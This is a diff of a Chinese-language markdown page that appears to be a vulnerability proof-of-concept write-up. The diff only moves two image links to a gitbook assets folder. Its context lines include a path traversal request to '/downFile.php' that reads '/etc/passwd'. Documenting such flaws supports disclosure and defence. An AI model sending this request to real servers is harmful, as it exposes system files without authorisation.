@@ -20,7 +20,7 @@
 
 登录页面
 
-![image-20230314090419140](images/image-20230314090419140.png)
+![image-20230314090419140](../.gitbook/assets/image-20230314090419140.png)
 
 验证POC
 
@@ -28,4 +28,4 @@
 /downFile.php?filename=../../../../etc/passwd
 ```
 
-![image-20230314090430563](images/image-20230314090430563.png)
+![image-20230314090430563](../.gitbook/assets/image-20230314090430563.png)
